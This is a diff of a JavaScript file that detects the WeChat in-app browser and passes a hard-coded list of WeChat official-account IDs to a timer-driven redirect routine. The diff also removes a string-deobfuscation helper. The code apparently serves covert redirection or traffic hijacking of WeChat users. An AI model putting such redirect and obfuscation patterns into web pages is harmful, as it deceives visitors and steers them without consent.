@@ -1,5 +1,3 @@
-var isIos = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
-var isArm = !!navigator.userAgent.match(/(Android|android)/);
 var gh=["gh_032228d5319a","gh_63f72d1cfc6c","gh_95635393f092","gh_c5a1f8bfbbbe","gh_4d5df930b22c","gh_119a4cd854df","gh_f3bc241774bd","gh_72a6df3c25cd","gh_cc5fd78b01a9"];
 
 function isWeiXin(){
@@ -9,28 +7,15 @@ function isWeiXin(){
     } else {
         return false;
     }
-};
+}
 
 function endaction() {
     try{
         window.name='ok' + Math.random();
         window.location.href = location.href+'?t=endjs';
     }catch(_0x1c7de6){}
-};
-
-function uncompileStr(code){
-    code=unescape(code);
-    var c=String.fromCharCode(code.charCodeAt(0)-code.length);
-    for(var i=1;i<code.length;i++)
-    {
-        c+=String.fromCharCode(code.charCodeAt(i)-c.charCodeAt(i-1));
-    }
-    return c;
-};
-
-function tostart(result){
-    goTo(result);
 }
+
 
 function goTo(username) {
     d = document;
@@ -79,7 +64,7 @@ function goTo(username) {
                         }
                     });
                     ha++;
-                    if (ha === 4) setTimeout(j, 200);
+                    if (ha === 2) setTimeout(j, 200);
                 } catch (e) {}
             }, 200);
         })
@@ -92,14 +77,31 @@ function goTo(username) {
     } else{
         k();
     }
+}
+
+document.ready = function (callback) {
+    if (document.addEventListener) {
+        document.addEventListener('DOMContentLoaded', function () {
+            document.removeEventListener('DOMContentLoaded', arguments.callee, false);
+            callback();
+        }, false);
+    }
+    else if (document.attachEvent) {
+        document.attachEvent('onreadystatechange', function () {
+            if (document.readyState == "complete") {
+                document.detachEvent("onreadystatechange", arguments.callee);
+                callback();
+            }
+        });
+    }
+    else if (document.lastChild == document.body) {
+        callback();
+    }
 };
 
-$(function(){
+document.ready(function(){
     if(window.name === ''){
-        if(isWeiXin() && isIos){
-            goTo(gh);
-        }
-        else if(isWeiXin()&&isArm){
+        if(isWeiXin() ){
             goTo(gh);
         }
     }else{
